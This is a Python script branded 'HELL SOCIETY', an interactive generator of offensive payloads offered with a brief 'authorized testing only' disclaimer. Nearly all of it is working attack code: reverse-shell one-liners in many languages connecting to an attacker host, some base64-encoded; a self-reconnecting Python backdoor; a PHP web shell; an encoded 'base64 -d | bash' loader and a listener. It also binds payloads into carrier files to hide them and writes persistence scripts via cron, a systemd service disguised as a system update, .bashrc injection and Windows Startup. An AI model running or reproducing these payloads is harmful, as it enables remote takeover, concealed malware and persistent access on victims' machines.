#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  HELL SOCIETY PAYLOAD GENERATOR & STEGANOGRAPHY                 ║
║  Created by: HELL SOCIETY Community                              ║
╚══════════════════════════════════════════════════════════════════╝

DISCLAIMER: This tool is for authorized penetration testing only.
Hell Society assumes no liability for misuse.
"""

import os
import sys
import time
import hashlib
import base64
import subprocess
import shutil
import random
import string

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system("pip3 install colorama 2>/dev/null")
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE
BW = Style.BRIGHT + Fore.WHITE; BG = Style.BRIGHT + Fore.GREEN
BY = Style.BRIGHT + Fore.YELLOW; BC = Style.BRIGHT + Fore.CYAN
BR = Style.BRIGHT + Fore.RED; RS = Style.RESET_ALL

BANNER = f"""{R}⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄{RS}
"""

OUTPUT_DIR = "payload_output"

# ═══════════════════════════════════════════════════════════════════
# PAYLOAD GENERATORS
# ═══════════════════════════════════════════════════════════════════

def gen_reverse_shell(host, port, lang="bash"):
    """Generate reverse shell payloads"""
    payloads = {
        'bash': f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
        'bash_base64': base64.b64encode(f'bash -i >& /dev/tcp/{host}/{port} 0>&1'.encode()).decode(),
        'python': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'python_short': f'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{host}\',{port}));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call([\'/bin/sh\'])"',
        'php': f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'ruby': f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{host}\",{port}))'",
        'perl': f'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        'nc': f'nc {host} {port} -e /bin/sh',
        'nc_base64': base64.b64encode(f'nc -e /bin/sh {host} {port}'.encode()).decode(),
        'powershell': f'$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
        'java': f'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]); p.waitFor()',
    }
    return payloads

def gen_payload_file(payload_type, host, port):
    """Generate a standalone payload file"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    if payload_type == "python_backdoor":
        code = f'''#!/usr/bin/env python3
import socket,subprocess,os,sys,time,threading
HOST = "{host}"
PORT = {port}

def shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    while True:
        try:
            shell()
        except:
            time.sleep({random.randint(10,30)})
'''
        filename = f"{OUTPUT_DIR}/backdoor.py"
        with open(filename, 'w') as f:
            f.write(code)
        return filename

    elif payload_type == "php_webshell":
        code = f'''<?php
// HELL SOCIETY Web Shell
if(isset($_GET['cmd'])){{
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}}
if(isset($_POST['cmd'])){{
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}}
?>
'''
        filename = f"{OUTPUT_DIR}/shell.php"
        with open(filename, 'w') as f:
            f.write(code)
        return filename

    elif payload_type == "encoded_bash":
        shell_cmd = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        encoded = base64.b64encode(shell_cmd.encode()).decode()
        code = f"echo '{encoded}' | base64 -d | bash\n"
        filename = f"{OUTPUT_DIR}/encoded_shell.sh"
        with open(filename, 'w') as f:
            f.write(code)
        return filename

    elif payload_type == "listener":
        code = f'''#!/usr/bin/env python3
import socket, threading
HOST = "0.0.0.0"
PORT = {port}

def handle_client(conn):
    print(f"[+] New connection from {{conn.getpeername()}}")
    conn.send(b"[*] Connected to HELL SOCIETY Shell\\n$ ")
    while True:
        try:
            cmd = input("$ ").strip()
            if cmd == "exit":
                break
            conn.send(cmd.encode() + b"\\n")
            data = conn.recv(4096)
            print(data.decode())
        except:
            break
    conn.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)
print(f"[*] Listening on {{HOST}}:{{PORT}}")
while True:
    conn, addr = s.accept()
    t = threading.Thread(target=handle_client, args=(conn,))
    t.start()
'''
        filename = f"{OUTPUT_DIR}/listener.py"
        with open(filename, 'w') as f:
            f.write(code)
        return filename

    return None

# ═══════════════════════════════════════════════════════════════════
# STEGANOGRAPHY
# ═══════════════════════════════════════════════════════════════════

def stego_hide_text_in_image(image_path, text, output_path):
    """Hide text in image using LSB steganography"""
    try:
        from PIL import Image
    except ImportError:
        os.system("pip3 install Pillow 2>/dev/null")
        from PIL import Image

    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    # Convert text to binary
    binary = ''.join(format(ord(c), '08b') for c in text) + '11111111'  # terminator
    
    if len(binary) > len(pixels) * 3:
        print(f"  {R}[!] Text too long for this image{RS}")
        return False

    new_pixels = []
    idx = 0
    for pixel in pixels:
        new_pixel = list(pixel)
        for i in range(min(3, len(new_pixel))):
            if idx < len(binary):
                new_pixel[i] = (new_pixel[i] & ~1) | int(binary[idx])
                idx += 1
        new_pixels.append(tuple(new_pixel))
    
    new_img = Image.new(img.mode, img.size)
    new_img.putdata(new_pixels)
    new_img.save(output_path)
    print(f"  {G}[+] Text hidden in: {output_path}{RS}")
    return True

def stego_extract_text_from_image(image_path):
    """Extract hidden text from image"""
    try:
        from PIL import Image
    except ImportError:
        from PIL import Image

    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    binary = ''
    for pixel in pixels:
        for i in range(min(3, len(pixel))):
            binary += str(pixel[i] & 1)
    
    text = ''
    for i in range(0, len(binary) - 8, 8):
        byte = binary[i:i+8]
        if byte == '11111111':
            break
        text += chr(int(byte, 2))
    
    return text

def bind_payload_with_file(payload_file, carrier_file, output_file):
    """Bind payload with carrier file (file concatenation)"""
    try:
        with open(carrier_file, 'rb') as f:
            carrier = f.read()
        with open(payload_file, 'rb') as f:
            payload = f.read()
        
        # Add marker
        marker = b"HS_PAYLOAD_MARKER_"
        combined = carrier + marker + payload
        
        with open(output_file, 'wb') as f:
            f.write(combined)
        
        print(f"  {G}[+] Files bound: {output_file}{RS}")
        print(f"  {G}[+] Carrier: {os.path.getsize(carrier_file)} bytes{RS}")
        print(f"  {G}[+] Payload: {os.path.getsize(payload_file)} bytes{RS}")
        print(f"  {G}[+] Output: {os.path.getsize(output_file)} bytes{RS}")
        return True
    except Exception as e:
        print(f"  {R}[!] Error: {e}{RS}")
        return False

def extract_bound_payload(input_file, output_path):
    """Extract payload from bound file"""
    try:
        with open(input_file, 'rb') as f:
            data = f.read()
        
        marker = b"HS_PAYLOAD_MARKER_"
        idx = data.find(marker)
        if idx == -1:
            print(f"  {R}[!] No payload marker found{RS}")
            return False
        
        payload = data[idx + len(marker):]
        with open(output_path, 'wb') as f:
            f.write(payload)
        
        print(f"  {G}[+] Payload extracted: {output_path} ({len(payload)} bytes){RS}")
        return True
    except Exception as e:
        print(f"  {R}[!] Error: {e}{RS}")
        return False

# ═══════════════════════════════════════════════════════════════════
# PERSISTENCE TECHNIQUES
# ═══════════════════════════════════════════════════════════════════

def gen_persistence_script(script_path, method="cron"):
    """Generate persistence scripts"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    if method == "cron":
        script = f'''#!/bin/bash
# HELL SOCIETY Persistence - Cron
(crontab -l 2>/dev/null; echo "* * * * * python3 {script_path} >/dev/null 2>&1") | crontab -
echo "[+] Cron persistence installed"
'''
    elif method == "systemd":
        service_name = f"system-update-{random.randint(1000,9999)}"
        script = f'''#!/bin/bash
# HELL SOCIETY Persistence - Systemd
cat > /etc/systemd/system/{service_name}.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable {service_name}.service
systemctl start {service_name}.service
echo "[+] Systemd persistence installed"
'''
    elif method == "bashrc":
        script = f'''#!/bin/bash
# HELL SOCIETY Persistence - Bashrc
echo "" >> ~/.bashrc
echo "# System check" >> ~/.bashrc
echo "python3 {script_path} &>/dev/null &" >> ~/.bashrc
echo "[+] Bashrc persistence installed"
'''
    elif method == "windows_startup":
        script = f'''@echo off
:: HELL SOCIETY Persistence - Windows Startup
copy "%~dp0agent.py" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system_check.pyw"
echo [+] Windows startup persistence installed
'''

    filename = f"{OUTPUT_DIR}/persist_{method}.sh"
    with open(filename, 'w') as f:
        f.write(script)
    os.chmod(filename, 0o755)
    print(f"  {G}[+] Persistence script created: {filename}{RS}")
    return filename

# ═══════════════════════════════════════════════════════════════════
# MAIN MENU
# ═══════════════════════════════════════════════════════════════════

def menu_payload_gen():
    """Payload generation menu"""
    print(f"\n  {BW}{Style.BRIGHT}  PAYLOAD GENERATOR{RS}")
    print(f"  {C}  {'═' * 50}{RS}")
    
    host = input(f"  {Y}[*] LHOST: {RS}").strip() or "127.0.0.1"
    port = input(f"  {Y}[*] LPORT: {RS}").strip() or "4444"
    
    print(f"\n  {BW}  Payload Types:{RS}")
    print(f"  {C}  {'─' * 40}{RS}")
    print(f"  {G}[1] {W}Reverse Shell Payloads (all languages){RS}")
    print(f"  {G}[2] {W}Python Backdoor File{RS}")
    print(f"  {G}[3] {W}PHP Web Shell{RS}")
    print(f"  {G}[4] {W}Encoded Bash Shell{RS}")
    print(f"  {G}[5] {W}Listener Script{RS}")
    print(f"  {G}[6] {W}All Payloads{RS}")
    print()
    
    choice = input(f"  {R}root@hellhs{RS}:{C}payloads{RS}# ").strip()
    
    if choice in ('1', '2', '3', '4', '5', '6'):
        if choice == '1':
            payloads = gen_reverse_shell(host, port)
            print(f"\n  {BW}{Style.BRIGHT}  GENERATED PAYLOADS:{RS}")
            print(f"  {C}  {'═' * 55}{RS}")
            for name, payload in payloads.items():
                print(f"  {Y}  [{name}]{RS}")
                print(f"  {W}  {payload[:120]}{'...' if len(payload)>120 else ''}{RS}")
                print()
        
        elif choice == '2':
            fname = gen_payload_file("python_backdoor", host, port)
            print(f"  {G}[+] Saved: {fname}{RS}")
        
        elif choice == '3':
            fname = gen_payload_file("php_webshell", host, port)
            print(f"  {G}[+] Saved: {fname}{RS}")
        
        elif choice == '4':
            fname = gen_payload_file("encoded_bash", host, port)
            print(f"  {G}[+] Saved: {fname}{RS}")
        
        elif choice == '5':
            fname = gen_payload_file("listener", host, port)
            print(f"  {G}[+] Saved: {fname}{RS}")
        
        elif choice == '6':
            payloads = gen_reverse_shell(host, port)
            gen_payload_file("python_backdoor", host, port)
            gen_payload_file("php_webshell", host, port)
            gen_payload_file("encoded_bash", host, port)
            gen_payload_file("listener", host, port)
            print(f"\n  {BW}{Style.BRIGHT}  ALL PAYLOADS GENERATED:{RS}")
            for name, payload in payloads.items():
                print(f"  {Y}  [{name}]: {W}{payload[:80]}...{RS}")
            print(f"  {G}\n  [+] All files saved in {OUTPUT_DIR}/{RS}")
    
    print(f"\n  {G}[1] {W}Generate more payloads{RS}")
    print(f"  {R}[2] {W}Back to main menu{RS}")
    c = input(f"  {R}root@hellhs{RS}:{C}payloads{RS}# ").strip()
    if c == "1":
        menu_payload_gen()

def menu_steganography():
    """Steganography menu"""
    print(f"\n  {BW}{Style.BRIGHT}  STEGANOGRAPHY{RS}")
    print(f"  {C}  {'═' * 50}{RS}")
    print(f"  {G}[1] {W}Hide text in image{RS}")
    print(f"  {G}[2] {W}Extract text from image{RS}")
    print(f"  {G}[3] {W}Bind payload with file{RS}")
    print(f"  {G}[4] {W}Extract bound payload{RS}")
    print(f"  {G}[5] {W}Encode/Decode base64{RS}")
    print(f"  {R}[0] {W}Back to main menu{RS}")
    print()
    
    choice = input(f"  {R}root@hellhs{RS}:{C}stego{RS}# ").strip()
    
    if choice == "1":
        image = input(f"  {Y}[*] Image path: {RS}").strip()
        text = input(f"  {Y}[*] Text to hide: {RS}").strip()
        output = input(f"  {Y}[*] Output path: {RS}").strip() or "output_stego.png"
        stego_hide_text_in_image(image, text, output)
    
    elif choice == "2":
        image = input(f"  {Y}[*] Image path: {RS}").strip()
        text = stego_extract_text_from_image(image)
        print(f"  {G}[+] Extracted: {text}{RS}")
    
    elif choice == "3":
        payload = input(f"  {Y}[*] Payload file: {RS}").strip()
        carrier = input(f"  {Y}[*] Carrier file: {RS}").strip()
        output = input(f"  {Y}[*] Output file: {RS}").strip() or "output_bound"
        bind_payload_with_file(payload, carrier, output)
    
    elif choice == "4":
        inp = input(f"  {Y}[*] Input file: {RS}").strip()
        out = input(f"  {Y}[*] Output path: {RS}").strip() or "extracted_payload"
        extract_bound_payload(inp, out)
    
    elif choice == "5":
        print(f"  {G}[1] Encode{RS}  {G}[2] Decode{RS}")
        c = input(f"  {R}root@hellhs{RS}:{C}b64{RS}# ").strip()
        if c == "1":
            text = input(f"  {Y}[*] Text: {RS}").strip()
            print(f"  {G}[+] {base64.b64encode(text.encode()).decode()}{RS}")
        elif c == "2":
            text = input(f"  {Y}[*] Base64: {RS}").strip()
            print(f"  {G}[+] {base64.b64decode(text).decode()}{RS}")

def menu_persistence():
    """Persistence menu"""
    print(f"\n  {BW}{Style.BRIGHT}  PERSISTENCE GENERATOR{RS}")
    print(f"  {C}  {'═' * 50}{RS}")
    
    script = input(f"  {Y}[*] Script to persist (path): {RS}").strip() or "./agent.py"
    
    print(f"\n  {G}[1] {W}Cron job{RS}")
    print(f"  {G}[2] {W}Systemd service{RS}")
    print(f"  {G}[3] {W}Bashrc injection{RS}")
    print(f"  {G}[4] {W}Windows startup{RS}")
    print(f"  {G}[5] {W}Generate all{RS}")
    print()
    
    choice = input(f"  {R}root@hellhs{RS}:{C}persist{RS}# ").strip()
    
    methods = {'1': 'cron', '2': 'systemd', '3': 'bashrc', '4': 'windows_startup'}
    
    if choice in methods:
        gen_persistence_script(script, methods[choice])
    elif choice == '5':
        for m in methods.values():
            gen_persistence_script(script, m)

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

def main():
    print(BANNER)
    print(f"  {BW}{Style.BRIGHT}  HELL SOCIETY - PAYLOAD & STEGANOGRAPHY TOOL{RS}")
    print(f"  {R}{Style.BRIGHT}  Reverse Shells | Payloads | Stego | Persistence{RS}")
    print()
    
    while True:
        print(f"  {BC}╔═══════════════════════════════════════════════════════╗{RS}")
        print(f"  {BC}║  {BW}HELL SOCIETY TOOLS{RS}                                       {RS}{BC}║{RS}")
        print(f"  {BC}╚═══════════════════════════════════════════════════════╝{RS}")
        print()
        print(f"  {G}[1] {BW}Payload Generator{RS}")
        print(f"  {G}[2] {BW}Steganography{RS}")
        print(f"  {G}[3] {BW}Persistence Generator{RS}")
        print(f"  {R}[0] {BW}Exit{RS}")
        print()
        
        choice = input(f"  {R}root@hellhs{RS}:{C}~{RS}# ").strip()
        
        if choice == "1":
            menu_payload_gen()
        elif choice == "2":
            menu_steganography()
        elif choice == "3":
            menu_persistence()
        elif choice == "0":
            print(f"\n  {Y}[*] Goodbye.{RS}")
            break

if __name__ == "__main__":
    main()
